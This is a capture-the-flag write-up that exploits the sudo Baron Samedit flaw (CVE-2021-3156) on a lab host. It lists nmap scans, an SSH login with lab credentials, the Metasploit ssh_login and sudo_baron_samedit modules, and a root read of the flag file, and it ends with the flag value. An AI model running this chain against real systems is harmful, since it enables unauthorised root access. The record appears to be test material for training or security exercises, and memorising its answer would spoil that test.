# Vulnerability Exploitation Report: CVE-2021-3156

## Vulnerability Overview
**CVE ID**: CVE-2021-3156  
**CVSS Score**: 7.8 (High)  
**Description**: The Baron Samedit vulnerability in `sudo` (versions including 1.8.31) allows local privilege escalation via a buffer overflow in the `sudoedit -s` command. This flaw enables an authenticated user to gain root privileges on the target system.

## Objective
Exploit the CVE-2021-3156 vulnerability on a target system to escalate privileges from a low-privileged user (`student`) to root and retrieve a flag file (`/root/flag.txt`) as part of a capture-the-flag (CTF) challenge.

## Target Information
- **Target IP**: 192.168.5.3
- **Target Port**: 22 (SSH)
- **Attack Machine IP**: 192.168.0.5
- **Credentials**: Username: `student`, Password: `password`
- **Objective**: Retrieve the contents of `/root/flag.txt`

## Exploitation Steps

### Step 1: Network Discovery
Perform a ping scan to identify active hosts in the 192.168.5.0/24 subnet.

```
nmap -sn 192.168.5.0/24
```

### Step 2: Service Enumeration
Enumerate services on the target host (192.168.5.3) to confirm the presence of SSH or other services.

```
nmap -sV 192.168.5.3
```

### Step 3: SSH Connection
Connect to the target system via SSH using the provided credentials.

```
SSHConnect(ssh_ipaddr='192.168.5.3', ssh_port='22', ssh_username='student', ssh_password='password')
```

### Step 4: Verify Sudo Version
Check the version of `sudo` on the target system to confirm it is vulnerable (e.g., 1.8.31).

```
sudo -V
```

### Step 5: Launch Metasploit
Start the Metasploit Framework to access exploit modules.

```
msfconsole
```

### Step 6: Search for SSH Login Module
Search for a Metasploit module to authenticate via SSH.

```
search ssh login
```

### Step 7: Select SSH Login Module
Choose the Metasploit module for SSH login to establish a session.

```
use auxiliary/scanner/ssh/ssh_login
```

### Step 8: Review Module Details
Display information about the SSH login module to understand its options.

```
info
```

### Step 9: Configure SSH Login
Set the target host, username, and password for the SSH login attempt.

```
set RHOSTS 192.168.5.3
```

```
set USERNAME student
```

```
set PASSWORD password
```

### Step 10: Execute SSH Login
Run the SSH login module to establish a session on the target system.

```
run
```

### Step 11: Search for Sudo Exploit
Search Metasploit for an exploit module targeting the `sudo` Baron Samedit vulnerability (CVE-2021-3156).

```
search sudo 1.8.31
```

### Step 12: Select Sudo Exploit Module
Choose the Metasploit module for the Baron Samedit privilege escalation vulnerability.

```
use exploit/linux/local/sudo_baron_samedit
```

### Step 13: Review Exploit Details
Display information about the selected exploit module to understand its requirements.

```
info
```

### Step 14: Configure Exploit Session
Set the Metasploit session ID for the exploit to use the established SSH session.

```
set SESSION 1
```

### Step 15: Execute the Exploit
Run the exploit to escalate privileges to root.

```
exploit
```

### Step 16: Retrieve the Flag
Read the contents of the `flag.txt` file in the `/root` directory.

```
cat /root/flag.txt
```

## Final Result
The exploitation was successful, and the flag was retrieved from the target system.

**Flag**: Upg3TfoBWoMCxCqv